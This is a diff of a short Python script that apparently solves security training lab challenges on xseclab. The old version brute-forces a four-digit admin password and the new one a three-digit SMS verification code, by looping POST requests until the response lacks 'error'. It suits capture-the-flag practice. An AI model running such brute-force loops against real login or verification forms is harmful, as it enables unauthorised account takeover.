@@ -7,16 +7,15 @@ header = {
 'Cookie':'saeut=124.89.2.88.1434295791298139; PHPSESSID=cce5635812b7a8cad07ae7f41b2f4598',
 }
 value = {
-		'username':'admin',
-		'pwd':1234,
+		'username':'13399999999',
+		'vcode':1234,
 		'vcode':'',
 }
 
-for i in range(1000, 10000):
-	value['pwd'] = i
-	r = s.post('http://lab1.xseclab.com/vcode2_a6e6bac0b47c8187b09deb20babc0e85/login.php',headers=header,data=value)
-	r.encoding = 'utf-8'
-	if 'error' not in r.text:
+for i in range(100, 1000):
+	value['vcode'] = i
+	r = s.post('http://lab1.xseclab.com/vcode6_mobi_b46772933eb4c8b5175c67dbc44d8901/login.php',headers=header,data=value)
+	if 'error' not in str(r.content):
 		print('find pwd: %d ' % i)
-		print(r.text)
+		print(r.content)
 		exit()
